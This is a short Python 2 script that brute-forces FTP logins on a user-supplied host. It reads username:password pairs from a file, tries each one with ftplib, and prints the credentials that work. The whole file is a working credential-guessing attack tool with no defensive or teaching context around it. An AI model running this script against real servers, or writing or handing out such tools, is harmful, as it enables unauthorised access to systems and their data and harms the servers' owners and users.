# -*- coding: utf-8 -*-
"""
Created on Sat Aug 11 20:24:38 2018

@author: bharg
"""

import ftplib

def bruteforce(hostname,passfile):
    ftp=ftplib.FTP(hostname)
    contents=open(passfile,"r")
    for line in contents.readlines():
        username=line.split(":")[0]
        password=line.split(":")[1].strip("\n")
        print "The username and password in this iteration are: %s and %s "%(username,password)
        try:
            ftp.login(username,password)
            print " The login worked successfully for username: %s and password %s"%(username,password)
        except:
            pass

def main():
    hostname=raw_input("Enter the hostname that you want to probe with")
    passfile=raw_input("provide the password file to probe against")
    bruteforce(hostname,passfile)

if __name__=="__main__":
    main()
    